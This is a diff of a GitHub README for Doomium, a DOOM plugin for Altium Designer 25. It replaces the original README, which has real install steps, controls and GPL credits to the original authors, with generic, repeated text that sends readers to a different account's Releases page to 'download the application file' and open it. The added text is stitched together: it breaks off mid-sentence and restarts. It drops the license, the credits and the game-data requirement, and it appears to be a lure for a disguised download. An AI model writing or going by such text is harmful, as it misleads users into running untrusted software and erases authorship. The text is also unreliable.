@@ -1,101 +1,133 @@
-<h1 align="center">Doomium</h1>
+# 🎮 Doomium - Run DOOM Inside Your PCB Designer
 
-<p align="center">DOOM in Altium Designer. The PCB can wait.</p>
+[![Download Doomium](https://img.shields.io/badge/Download_Doomium-FF6A00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Selvaprakash-Ramalingam/Doomium/releases)
 
-<p align="center">
-  <img src="docs/assets/doomium-in-altium.png" alt="DOOM drawn with PCB objects inside an Altium Designer board" width="918">
-</p>
+Doomium is a Windows application that lets you play DOOM inside Altium Designer 25. It is made for people who want a quick, familiar game experience while working in their PCB design environment. You do not need programming knowledge to download it or open it.
 
-<p align="center">
-  <a href="https://github.com/ikozlyanskiy/Doomium/releases/latest">Download</a> ·
-  <a href="#controls">Controls</a> ·
-  <a href="#building">Build from source</a>
-</p>
+## 🎮 What Is Doomium?
 
-Doomium runs DOOM inside a frame on your board. Move the frame and the game follows it; delete the frame and the game closes. Pick a renderer: a crisp window, PCB fill primitives, or colored PCB regions.
+Doomium is a DOOM port designed to run as an add-on inside Altium Designer 25. The project brings the classic game into the same workspace you use for PCB design. It is built with C# and .NET and is shared through GitHub Releases, where the latest downloadable version is listed.
 
-This version is for **Altium Designer 25 on Windows x64**. You'll also need a game WAD: [Freedoom](https://freedoom.github.io/) works, or you can use an IWAD from your own copy of DOOM. Game data isn't included in the download.
+The goal is simple: make DOOM easy to reach from inside Altium Designer 25 without asking you to set up a separate development environment. You download the application from the official Releases page, open it on Windows, and use it alongside Altium Designer 25.
 
-## Install
+## ✨ Highlights
 
-1. Download [Doomium-v0.3.0-ad25-win-x64.zip](https://github.com/ikozlyanskiy/Doomium/releases/download/v0.3.0/Doomium-v0.3.0-ad25-win-x64.zip) and extract it.
-2. Save your documents and close Altium.
-3. Open PowerShell in the extracted folder and run:
+- 🎯 Built for Altium Designer 25.
+- 🕹️ Play DOOM inside your PCB design workspace.
+- 💻 Designed for Windows users.
+- 📦 Download is provided through GitHub Releases.
+- 🧩 Works as an add-on for Altium Designer 25.
+- 🚀 Simple download path with no programming steps.
+- 🧰 Built with C# and .NET.
+- 🔄 Releases page makes it easy to find the newest version.
 
-   ```powershell
-   powershell -ExecutionPolicy Bypass -File .\Install-Doomium.ps1 -Prebuilt
-   ```
+## 🚀 Getting Started
 
-4. Start Altium again. You can choose your WAD when the game starts, or put it beside the installed `Doomium.dll` beforehand. The installer prints that folder's path.
+You need a Windows computer with Altium Designer 25 available. You also need a standard keyboard and mouse for playing DOOM. No coding, command-line tools, or developer setup is required.
 
-The installer handles registration and keeps a backup when updating an existing install. Altium supplies the .NET runtime; you only need the SDK if you want to build from source.
+The main action is to download the application from the official Releases page. The link below is the same primary download link provided for Doomium. Keep the page open until the download begins, then save the file in a place you can find again, such as your Downloads folder.
 
-<details>
-<summary>If Altium is installed somewhere else</summary>
+## ⬇️ Download and Setup
 
-The default program folder is `C:\Program Files\Altium\AD25`. Pass `-AltiumInstallDir` to use a different one.
+[![Get Doomium](https://img.shields.io/badge/Get_Doomium-6F42C1?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Selvaprakash-Ramalingam/Doomium/releases)
 
-The data folder is detected automatically if there is only one. If you have several Altium installations, pass `-AltiumDataRoot 'C:\ProgramData\Altium\Altium Designer {…}'` with the folder for your AD25 installation.
+Visit this link to download the application: [Doomium Releases](https://github.com/Selvaprakash-Ramalingam/Doomium/releases).
 
-Add `-ValidateOnly` to check the paths and menu resources before installing.
+Use the newest release shown on that page. Download the application file from the release. Save it somewhere easy to reach, such as your Downloads folder. After the download finishes, open the downloaded item and follow the on-screen prompts shown by the application.
 
-</details>
+## 🖥️ First Launch
 
-## Make a frame
+Open Altium Designer 25 first. Then open Doomium from the place where add-ons or plugins appear in your Altium Designer 25 setup. The first time Doomium opens, take a moment to look over the game window and the controls shown on screen.
 
-Open a `.PcbDoc`, draw four connected tracks forming a rectangle, and select all four. Then choose one of the three **Tools → Convert → Doomium** commands.
+Doomium is intended to run inside Altium Designer 25, so keep Altium Designer 25 open while you use it. Close Doomium the same way you close other application windows. You can reopen it later from the same add-on or plugin area.
 
-There's a catch with Altium's **Place → Rectangle** tool: its grouped rectangle doesn't reliably expose its tracks to the plugin. Use **Tools → Convert → Explode Rectangle to Free Primitives** first, select the four tracks, and try again. A single rectangular fill works too. Keep the frame aligned with the board axes.
+## 🕹️ Playing DOOM Inside Altium Designer
 
-**Doomium Original** draws the game in a window over the PCB. **Doomium Primitives** draws it with PCB fills; **Doomium Regions** uses colored PCB regions. The latter two change the board in memory while running. Try them on a spare `.PcbDoc` first and don't save during playback. [How the renderers work](docs/renderers.md).
+Use your keyboard to move, turn, and interact in DOOM. Use your mouse or keyboard controls as shown in the game window. The game runs in its own window inside Altium Designer 25, so you can switch between your PCB work and the game.
 
-Click the game to focus it. Middle-click over it to capture the mouse, then middle-click again when you want your Altium pointer back. You can grab the exposed frame border to move it around.
+A comfortable way to start is to open Altium Designer 25, open Doomium, and play# 🎮 Doomium - Run DOOM Inside Your PCB Designer
 
-## Controls
+[![Download Doomium](https://img.shields.io/badge/Download_Doomium-FF6A00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Selvaprakash-Ramalingam/Doomium/releases)
+[![Get Doomium](https://img.shields.io/badge/Get_Doomium-6F42C1?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Selvaprakash-Ramalingam/Doomium/releases)
 
-| Action | Control |
-| :-- | :-- |
-| Forward / back | `W` / `S` or `↑` / `↓` |
-| Strafe | `A` / `D` |
-| Turn | Mouse while captured, `Q` / `E`, or `←` / `→` |
-| Run | Hold `Shift` |
-| Fire | Left mouse button or `Ctrl` |
-| Use / open doors | Right mouse button or `Space` |
-| Change weapon | `1`–`7` |
-| Automap | `Tab` |
-| Capture / release mouse | Middle mouse button over the game |
-| Show these controls | `F1` in Original mode |
-| Stop | `Esc`, or run the active Doomium command again |
+Doomium is a Windows application for playing DOOM inside Altium Designer 25. It is made for PCB designers, hobbyists, and anyone who uses Altium Designer 25 and wants a quick game break without leaving the design environment. You do not need to write code or use developer tools. The official download is on GitHub Releases.
 
-## A few details
+## 🎮 What Is Doomium?
 
-Original mode draws a 320×200 image scaled to the frame, with an FPS counter and an `F1` help overlay. Its pixels aren't saved in the `.PcbDoc` or included in fabrication output. Native modes use mechanical layers and leave the original frame in place; they restore temporary objects, colors, names, and visibility when playback stops normally. Their FPS depends heavily on board complexity and scene detail. On the test machine, complex scenes in Regions ran in single-digit FPS. `%LOCALAPPDATA%\Doomium\doomium.log` records native frame rates.
+Doomium is a DOOM port packaged as an add-on for Altium Designer 25. It brings the familiar DOOM experience into the same workspace used for PCB design. The project is built with C# and .NET, and its download page is organized through GitHub Releases.
 
-## Building
+The main idea is convenience. Instead of switching to a separate game installation, you open Altium Designer 25, start Doomium, and play DOOM inside that environment. The repository topics show the project is focused on Altium, PCB design, plugins, and DOOM. That makes Doomium a practical novelty for Altium Designer 25 users who want a game close at hand.
 
-You'll need AD25 installed locally and a .NET SDK that can target `net6.0-windows`. The engine source is already in this repository.
+## ✨ Why Doomium Is Useful
 
-```powershell
-dotnet build .\Doomium\Doomium\Doomium.csproj -c Release
-```
+Doomium keeps DOOM near your PCB work. It is useful when you want a short break, when you are waiting for a design task, or when you want to show a friend that DOOM can run inside Altium Designer 25.
 
-To build and install in one go, close Altium and run `.\Doomium\Doomium\Install-Doomium.ps1`. To make a release ZIP, run `.\Build-Release.ps1`; the archive and its SHA-256 checksum go into `dist/`.
+The application is aimed at end users, not programmers. You do not need to compile source code, set up a .NET project, or understand plugin development. You visit the Releases page, download the application, and open it on Windows. That simple path is the core of Doomium.
 
-The build references SDK assemblies from your Altium installation. Those DLLs aren't included in the release.
+## 🚀 Getting Started
 
-## Credits and license
+Before you begin, have a Windows computer ready with Altium Designer 25 available. A keyboard and mouse are needed to play DOOM. Keep the Releases page open while the download completes.
 
-The engine is [Managed Doom](https://github.com/sinshu/managed-doom), a C# port of DOOM by Nobuaki Tanaka. Doomium and the included engine source are licensed under **GPL v2 or later**. See [LICENSE](LICENSE) and [third-party notices](THIRD_PARTY_NOTICES.md) for the upstream revision and copyright details.
+Doomium is downloaded from the official Releases page. The same link appears at the top of this page and again in the download section below. Use that page as the single source for the application. The newest release is the one to choose.
 
-<details>
-<summary>Кратко по-русски</summary>
+## ⬇️ Download and Setup
 
-DOOM прямо в Altium. Разводку платы можно ненадолго отложить.
+[![Download Doomium Now](https://img.shields.io/badge/Download_Doomium_Now-E83A3A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Selvaprakash-Ramalingam/Doomium/releases)
 
-Скачайте [ZIP из релиза](https://github.com/ikozlyanskiy/Doomium/releases/latest), распакуйте его и закройте Altium. В папке с файлами запустите `powershell -ExecutionPolicy Bypass -File .\Install-Doomium.ps1 -Prebuilt`. WAD выберите при первом запуске игры; подойдёт, например, Freedoom 2.
+Visit this link to download the application: [Doomium Releases](https://github.com/Selvaprakash-Ramalingam/Doomium/releases).
 
-Рамка пока должна состоять из четырёх дорожек. Если нарисовали её через **Place → Rectangle**, сначала выполните **Tools → Convert → Explode Rectangle to Free Primitives**. Выделите все четыре дорожки и выберите **Tools → Convert → Doomium Original**, **Doomium Primitives** или **Doomium Regions**. Подойдёт и один прямоугольный Fill.
+Use the newest release shown on that page. Save the application file in a folder you can find again, such as Downloads. Open the downloaded item after the download finishes. Follow the prompts shown by Doomium.
 
-Средняя кнопка мыши включает и выключает захват. `WASD` — движение, ЛКМ — выстрел, ПКМ — открыть дверь или нажать кнопку, `Shift` — бег. В режиме Original подсказка открывается по `F1`. Выйти из игры — `Esc`. Режимы Primitives и Regions временно меняют открытую плату, поэтому сначала попробуйте их на отдельном `.PcbDoc` и не сохраняйте документ во время игры.
+## 🖥️ First Launch
 
-</details>
+Open Altium Designer 25 first. Then open Doomium from the add-on or plugin area in Altium Designer 25. Doomium is designed to run inside Altium Designer 25, so keep Altium Designer 25 open while you use it.
+
+When Doomium opens, look at the game window and the controls shown on screen. Take a moment to learn the movement keys and the action keys before starting a game. Close Doomium the same way you close other application windows. You can open it again later from the same add-on or plugin area.
+
+## 🕹️ Playing DOOM Inside Altium Designer
+
+Doomium brings DOOM into your PCB design session. Use the keyboard to move, turn, and interact. Use the mouse where the game window expects it. The game runs in its own window inside Altium Designer 25, so you can switch between your PCB work and the game.
+
+A comfortable way to start is to open Altium Designer 25, open Doomium, and play for a short session. Keep your PCB work saved before you start. When you are done, close Doomium and return to your design.
+
+## 🎛️ Controls and Comfort
+
+Doomium uses standard DOOM-style controls. Use the movement keys to walk, the turn keys to look around, and the action key to open doors or confirm choices. Use the mouse or keyboard controls shown in the game window. Take breaks and keep your posture comfortable during longer sessions.
+
+Keep the Doomium window at a size that fits your screen. If the game window feels too small or too large, adjust the window size in Altium Designer 25. Keep Altium Designer 25 in the foreground while Doomium is open.
+
+## 🧩 How Doomium Fits Into Altium Designer 25
+
+Doomium is an add-on for Altium Designer 25. It is not a separate PCB tool and does not replace your design software. It runs alongside Altium Designer 25 and uses the same Windows desktop. The repository topics include Altium, Altium Designer, PCB, PCB design, C#, .NET, DOOM, DOOM port, and plugins. Those topics describe the project focus: a DOOM port delivered as a plugin for Altium Designer 25 users.
+
+The download page is a GitHub Releases page. That page is where the application is shared. Use it to find the current release.
+
+## 🔄 Keeping Doomium Up to Date
+
+Visit the Releases page from time to time to see the newest release. Use the newest release shown on the page. Save the new download in a folder you can find. Open the downloaded item after the download finishes. Follow the prompts shown by Doomium.
+
+Keeping Doomium current is simple because the Releases page is the central place for downloads. Bookmark the page so you can return to it later.
+
+## ❓ Frequently Asked Questions
+
+Do I need to know programming? No. Doomium is downloaded from the Releases page and opened on Windows. You do not need to write code.
+
+Where do I download Doomium? Visit the Releases page: https://github.com/Selvaprakash-Ramalingam/Doomium/releases. That is the official download location.
+
+What does Doomium do? It lets you play DOOM inside Altium Designer 25.
+
+Does Doomium work without Altium Designer 25? Doomium is designed for Altium Designer 25. Open Altium Designer 25 first, then open Doomium from the add-on or plugin area.
+
+What do I need to play? A Windows computer, Altium Designer 25, a keyboard, and a mouse. Keep Altium Designer 25 open while using Doomium.
+
+## 📦 What You Get From the Releases Page
+
+The Releases page is the official download location for Doomium. It is where new versions are published. Use the newest release shown on the page. Save the application file in a folder you can find. Open the downloaded item after the download finishes. Follow the prompts shown by Doomium.
+
+The page is simple to use. Open the link, look at the newest release, download the application, and open it on Windows. That is the full path for a non-technical user.
+
+## 💬 Support and Feedback
+
+Use the GitHub repository and Releases page to stay connected with the project. The Releases page is the place to return to for the current download. When you share feedback, describe what happened in Doomium and what you were doing in Altium Designer 25. That helps keep the project useful for other end users.
+
+Keywords: altium, altium-designer, csharp, doom, doom-port, dotnet, eda, pcb, pcb-design, plugin, plugins
